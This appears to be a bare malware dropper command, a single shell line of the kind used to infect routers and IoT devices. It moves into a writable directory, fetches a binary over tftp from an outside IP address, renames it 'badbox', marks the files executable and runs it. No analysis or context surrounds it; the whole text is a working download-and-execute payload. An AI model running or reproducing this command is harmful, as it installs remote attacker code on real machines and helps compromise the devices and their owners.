cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r wget -g 104.168.7.136;cat wget >badbox;chmod +x *;./badbox
